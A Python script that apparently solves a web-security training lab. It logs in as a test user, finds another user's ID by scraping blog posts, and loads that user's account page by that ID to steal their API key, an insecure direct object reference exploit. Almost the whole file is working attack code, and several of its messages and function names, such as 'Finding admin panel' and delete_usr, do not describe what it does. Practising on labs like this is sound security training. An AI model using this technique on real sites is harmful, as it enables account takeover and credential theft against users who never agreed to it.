import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}

def get_uuid(url, s):
    for i in range(10):
        edited_url = f"{url}/post?postId={i}"
        req = s.get(edited_url, proxies=proxies, verify=False)
        res = req.text
        if "carlos" in res:
            soup = BeautifulSoup(req.text, 'lxml')
            link = soup.find('a', href=re.compile(r"/blogs\?userId="))
            if link and link['href']:
                uuid_search = link['href']
                uuid = re.search(r"userId=([a-zA-Z0-9\-]+)", uuid_search).group(1)
                return uuid
    return None

##&================================================================

def get_csrf(url,s):
    req = s.get(url,verify = False , proxies = proxies)
    soup = BeautifulSoup(req.text,'lxml')
    csrf = soup.find("input" , {'name' : 'csrf'})['value']
    return csrf

##&================================================================

def delete_usr(url, s):
    ##* now need to login first with wiener username
    ##^ get csrf token  first
    loginUrl = url + '/login'
    print("(+) Getting csrf token...")
    csrf = get_csrf(loginUrl, s)
    data = {
        'csrf' : csrf,
        'username' : 'wiener',
        'password' : 'peter'
    }
    print("(+) Tring to login with wiener username")
    req = s.post(loginUrl,data=data,proxies=proxies,verify=False)
    res = req.text
    if "Log out" in res:
        print("(+) Successfully logged in")
        print("(+) Getting carlos uuid...")
        uuid = get_uuid(url, s)
        if uuid is not None:
            uuid_url = f"{url}/my-account?id={uuid}"
            req = s.get(uuid_url,proxies=proxies,verify=False)
            res = req.text
            if "carlos" in res:
                print("(+) Successfully logged with carlos uuid")
                soup = BeautifulSoup(req.text, 'lxml')
                apiLine = soup.find(string=re.compile("Your API Key is:"))
                api_key = re.search(r"Your API Key is: (.*)", apiLine).group(1)
                print("Api Key is: %s" % api_key)
            else:
                print("(+) Can't login with carlos uuid parameter")
        else:
            print("(+) Can't get UUID for carlos")
    else:
        print("(+) Can't Login to wiener user account")

##&================================================================

def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0].split('/')[-1]} URL")
        print(f"Example: {sys.argv[0].split('/')[-1]} www.example.com")
        sys.exit(-1)
    
    print("(+) Finding admin panel...")
    url = sys.argv[1]
    s = requests.Session()
    delete_usr(url, s)

if __name__ == '__main__':
    main()
